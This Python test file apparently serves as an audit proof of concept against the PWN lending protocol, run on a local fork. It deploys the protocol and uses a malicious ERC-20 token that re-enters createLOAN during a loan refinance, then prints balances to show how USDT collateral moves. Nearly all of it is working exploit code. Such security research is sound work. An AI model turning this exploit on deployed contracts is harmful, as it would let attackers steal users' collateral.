from dataclasses import dataclass
from wake.testing import *

from pytypes.core.src.config.PWNConfig import PWNConfig
from pytypes.core.src.loan.token.PWNLOAN import PWNLOAN
from pytypes.core.src.hub.PWNHub import PWNHub
from pytypes.core.src.utilizedcredit.PWNUtilizedCredit import PWNUtilizedCredit
from pytypes.core.src.nonce.PWNRevokedNonce import PWNRevokedNonce

from pytypes.core.lib.MultiToken.src.MultiToken import MultiToken
from pytypes.core.lib.MultiToken.src.MultiTokenCategoryRegistry import (
    MultiTokenCategoryRegistry,
)
from pytypes.core.src.loan.terms.simple.loan.PWNSimpleLoan import PWNSimpleLoan
from pytypes.core.src.utilizedcredit.PWNUtilizedCredit import PWNUtilizedCredit

from pytypes.core.src.loan.terms.simple.proposal.PWNSimpleLoanSimpleProposal import (
    PWNSimpleLoanSimpleProposal,
)
from pytypes.core.src.loan.vault.Permit import Permit as PWNPermit
from pytypes.wake.interfaces.IERC20 import IERC20
from pytypes.wake.ERC1967Factory import ERC1967Factory

from pytypes.tests.MaliciousERC20 import MaliciousERC20

ACTIVE_LOAN_TAG = keccak256(b"PWN_ACTIVE_LOAN")
LOAN_PROPOSAL_TAG = keccak256(b"PWN_LOAN_PROPOSAL")
NONCE_MANAGER_TAG = keccak256(b"NONCE_MANAGER")

USDT = IERC20("0xdac17f958d2ee523a2206206994597c13d831ec7")

@dataclass
class Permit:
    owner: Address
    spender: Address
    value: uint256
    nonce: uint256
    deadline: uint256


@chain.connect(fork="http://localhost:8545")
@on_revert(lambda e: print(e.tx.value if e.tx else "no tx"))
def test_reentrancy():
    hub = PWNHub.deploy()
    utilized_credit = PWNUtilizedCredit.deploy(hub, LOAN_PROPOSAL_TAG)
    revoked_nonce = PWNRevokedNonce.deploy(hub, NONCE_MANAGER_TAG)
    multi_token_registry = MultiTokenCategoryRegistry.deploy()

    proxy_factory = ERC1967Factory.deploy()

    config = PWNConfig.deploy()
    config = PWNConfig(
        proxy_factory.deploy_(config, chain.accounts[0]).return_value
    )

    config.initialize(chain.accounts[0], 0, chain.accounts[0])

    loan_token = PWNLOAN.deploy(hub)
    vault = PWNSimpleLoan.deploy(
        hub,
        loan_token,
        config,
        revoked_nonce,
        multi_token_registry,
    )

    simple_proposal = PWNSimpleLoanSimpleProposal.deploy(
        hub, revoked_nonce, config, utilized_credit
    )

    hub.setTag(simple_proposal, LOAN_PROPOSAL_TAG, True)
    hub.setTag(vault, NONCE_MANAGER_TAG, True)
    hub.setTag(vault, ACTIVE_LOAN_TAG, True)

    #vault = PWNSimpleLoan("0x9A93AE395F09C6F350E3306aec592763c517072e")
    #simple_proposal = PWNSimpleLoanSimpleProposal("0xEb3e6B9B51911175F3a121b5Efb46Fa354520f41")

    print(USDT.balanceOf(vault))

    # malicious ERC-20
    malicious_erc20 = MaliciousERC20.deploy()

    # make simple proposal

    lender = chain.accounts[1]
    borrower = chain.accounts[2]

    proposal = PWNSimpleLoanSimpleProposal.Proposal(
        collateralCategory=MultiToken.Category.ERC20,
        collateralAddress=USDT.address,
        collateralId=0,
        collateralAmount=100,
        checkCollateralStateFingerprint=False,
        collateralStateFingerprint=bytes32(0),
        creditAddress=malicious_erc20.address,
        creditAmount=100,
        availableCreditLimit=uint256.max,
        utilizedCreditId=bytes32(0),
        fixedInterestAmount=100,
        accruingInterestAPR=0,
        durationOrDate=1000,
        expiration=chain.blocks["pending"].timestamp + 1000,
        allowedAcceptor=Address.ZERO,
        proposer=borrower.address,
        proposerSpecHash=keccak256(abi.encode(PWNSimpleLoan.LenderSpec(borrower.address))),
        isOffer=False,
        refinancingLoanId=0,
        nonceSpace=0,
        nonce=0,
        loanContract=vault.address,
    )
    signature = borrower.sign_structured(
        proposal,
        Eip712Domain(
            name="PWNSimpleLoanSimpleProposal",
            version="1.3",
            chainId=chain.chain_id,
            verifyingContract=simple_proposal,
        ),
    )

    # mint & approve collateral
    mint_erc20(USDT, borrower, 100)
    USDT.approve(vault, 100, from_=borrower)

    mint_erc20(USDT, vault, 100)

    print(f"vault balance: ", USDT.balanceOf(vault))
    print(f"borrower balance: ", USDT.balanceOf(borrower))
    print("==================================")

    # mint & approve credit
    mint_erc20(malicious_erc20, lender, 100)
    malicious_erc20.approve(vault, 100, from_=lender)

    tx = vault.createLOAN(
        proposalSpec=PWNSimpleLoan.ProposalSpec(
            proposalContract=simple_proposal.address,
            proposalData=abi.encode(proposal),
            proposalInclusionProof=[],
            signature=signature,
        ),
        lenderSpec=PWNSimpleLoan.LenderSpec(
            sourceOfFunds=lender.address,
        ),
        callerSpec=PWNSimpleLoan.CallerSpec(
            refinancingLoanId=0,
            revokeNonce=False,
            nonce=0,
            permitData=b"",
        ),
        extra=b"",
        from_=lender,
    )
    old_loan_id = tx.return_value

    # refinance loan
    old_lender = lender
    lender = chain.accounts[3]
    borrower = chain.accounts[2]  # borrower must remain the same

    refinance_proposal = PWNSimpleLoanSimpleProposal.Proposal(
        collateralCategory=MultiToken.Category.ERC20,  # collateral must remain the same
        collateralAddress=USDT.address,
        collateralId=0,
        collateralAmount=100,
        checkCollateralStateFingerprint=False,
        collateralStateFingerprint=bytes32(0),
        creditAddress=malicious_erc20.address,
        creditAmount=1000,
        availableCreditLimit=uint256.max,
        utilizedCreditId=bytes32(0),
        fixedInterestAmount=100,
        accruingInterestAPR=1000,
        durationOrDate=1000,
        expiration=chain.blocks["pending"].timestamp + 1000,
        allowedAcceptor=Address.ZERO,
        proposer=borrower.address,
        proposerSpecHash=keccak256(abi.encode(PWNSimpleLoan.LenderSpec(borrower.address))),
        isOffer=False,
        refinancingLoanId=old_loan_id,
        nonceSpace=0,
        nonce=0,
        loanContract=vault.address,
    )
    signature = borrower.sign_structured(
        refinance_proposal,
        Eip712Domain(
            name="PWNSimpleLoanSimpleProposal",
            version="1.3",
            chainId=chain.chain_id,
            verifyingContract=simple_proposal,
        ),
    )

    mint_erc20(malicious_erc20, lender, 1000)
    malicious_erc20.approve(vault, 1000, from_=lender)

    nonce = abi.decode(
        malicious_erc20.call(abi.encode_with_signature("nonces(address)", lender)),
        [uint],
    )
    permit = Permit(
        lender.address, vault.address, 1000, nonce, uint256.max
    )
    domain = Eip712Domain(
        name="Malicious",
        version="1",
        chainId=chain.chain_id,
        verifyingContract=malicious_erc20,
    )

    permit_signature = lender.sign_structured(permit, domain)
    permit_data = abi.encode(
        PWNPermit(
            malicious_erc20.address,
            lender.address,
            1000,
            uint256.max,
            permit_signature[64],
            permit_signature[:32],
            permit_signature[32:64],
        )
    )

    mint_erc20(malicious_erc20, malicious_erc20, 1000)
    payload = abi.encode_call(
        vault.createLOAN,
        [
            PWNSimpleLoan.ProposalSpec(
                proposalContract=simple_proposal.address,
                proposalData=abi.encode(refinance_proposal),
                proposalInclusionProof=[],
                signature=signature,
            ),
            PWNSimpleLoan.LenderSpec(
                sourceOfFunds=malicious_erc20.address,
            ),
            PWNSimpleLoan.CallerSpec(
                refinancingLoanId=refinance_proposal.refinancingLoanId,
                revokeNonce=False,
                nonce=0,
                permitData=b"",
            ),
            b"",
        ]
    )
    malicious_erc20.setTarget(vault, payload)

    # transfer original loan token
    old_loan_owner = chain.accounts[4]
    loan_token.transferFrom(old_lender, old_loan_owner, old_loan_id, from_=old_lender)

    tx = vault.createLOAN(
        proposalSpec=PWNSimpleLoan.ProposalSpec(
            proposalContract=simple_proposal.address,
            proposalData=abi.encode(refinance_proposal),
            proposalInclusionProof=[],
            signature=signature,
        ),
        lenderSpec=PWNSimpleLoan.LenderSpec(
            sourceOfFunds=lender.address,
        ),
        callerSpec=PWNSimpleLoan.CallerSpec(
            refinancingLoanId=refinance_proposal.refinancingLoanId,
            revokeNonce=False,
            nonce=0,
            permitData=permit_data,
        ),
        extra=b"",
        from_=lender,
    )
    print(tx.call_trace)

    repayer = chain.accounts[5]
    amount = 1100
    mint_erc20(malicious_erc20, repayer, amount * 2)
    malicious_erc20.approve(vault, amount * 2, from_=repayer)
    vault.repayLOAN(2, b"", from_=repayer)
    vault.repayLOAN(3, b"", from_=repayer)

    print(f"vault balance: ", USDT.balanceOf(vault))
    print(f"borrower balance: ", USDT.balanceOf(borrower))
    print(f"lender balance: ", USDT.balanceOf(lender))
    print(f"old loan owner balance: ", USDT.balanceOf(old_loan_owner))
